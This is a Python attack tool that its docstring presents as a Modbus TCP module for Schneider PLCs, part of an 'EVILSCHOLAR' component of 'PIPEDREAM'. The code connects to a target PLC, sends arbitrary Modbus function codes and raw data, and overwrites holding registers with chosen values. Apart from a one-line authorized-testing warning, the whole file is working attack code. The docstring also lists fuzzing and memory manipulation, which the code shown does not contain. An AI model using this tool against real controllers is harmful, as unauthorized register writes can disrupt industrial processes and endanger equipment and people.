#!/usr/bin/env python3
"""
Modbus TCP Attack Module for Schneider PLCs

Custom Modbus commands and manipulation attacks.
Part of EVILSCHOLAR attack module for PIPEDREAM.

Capabilities:
- Custom Modbus command injection
- Register manipulation
- Function code fuzzing
- Memory manipulation

WARNING: For authorized security testing only.
"""

import socket
import struct
import logging
from typing import Optional, List

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [MODBUS-ATTACK] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('ModbusAttack')


class ModbusAttack:
    """Custom Modbus attack capabilities for Schneider PLCs"""

    MODBUS_PORT = 502

    def __init__(self, target: str, port: int = 502, timeout: float = 3.0):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.transaction_id = 1

    def write_custom_command(self, function_code: int, data: bytes, unit_id: int = 1) -> bool:
        """
        Send custom Modbus command

        Args:
            function_code: Modbus function code
            data: Command data
            unit_id: Modbus unit ID

        Returns:
            True if command sent successfully
        """
        logger.warning(f"[*] Sending custom Modbus command (FC: 0x{function_code:02X})")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Build Modbus request
            request = self._build_modbus_request(function_code, data, unit_id)

            sock.send(request)
            response = sock.recv(2048)

            sock.close()

            logger.info(f"[+] Response received: {len(response)} bytes")
            return True

        except Exception as e:
            logger.error(f"Custom command error: {e}")
            return False

    def manipulate_registers(self, start_addr: int, values: List[int]) -> bool:
        """
        Write multiple holding registers

        Args:
            start_addr: Starting register address
            values: List of values to write

        Returns:
            True if successful
        """
        logger.critical(f"[!!!] Manipulating {len(values)} register(s) starting at {start_addr}")

        try:
            # Function code 0x10 - Write Multiple Registers
            data = struct.pack('>HHB', start_addr, len(values), len(values) * 2)

            for value in values:
                data += struct.pack('>H', value)

            return self.write_custom_command(0x10, data)

        except Exception as e:
            logger.error(f"Register manipulation error: {e}")
            return False

    def _build_modbus_request(self, function_code: int, data: bytes, unit_id: int = 1) -> bytes:
        """Build Modbus TCP request"""
        transaction_id = self.transaction_id
        self.transaction_id += 1

        protocol_id = 0
        length = len(data) + 2

        mbap_header = struct.pack('>HHHB',
                                  transaction_id,
                                  protocol_id,
                                  length,
                                  unit_id)

        pdu = struct.pack('B', function_code) + data

        return mbap_header + pdu


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description='Modbus Attack Tool for Schneider PLCs (EVILSCHOLAR)'
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target PLC IP')
    parser.add_argument('--port', '-p', type=int, default=502,
                        help='Modbus port (default: 502)')
    parser.add_argument('--function-code', '-fc', type=lambda x: int(x, 0),
                        help='Custom function code (hex or decimal)')
    parser.add_argument('--data', type=str,
                        help='Hex data to send')
    parser.add_argument('--write-registers', nargs='+', type=int,
                        help='Register values to write')
    parser.add_argument('--start-addr', type=int, default=0,
                        help='Starting register address')

    args = parser.parse_args()

    attacker = ModbusAttack(args.target, args.port)

    if args.function_code and args.data:
        data = bytes.fromhex(args.data)
        attacker.write_custom_command(args.function_code, data)

    if args.write_registers:
        attacker.manipulate_registers(args.start_addr, args.write_registers)

    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
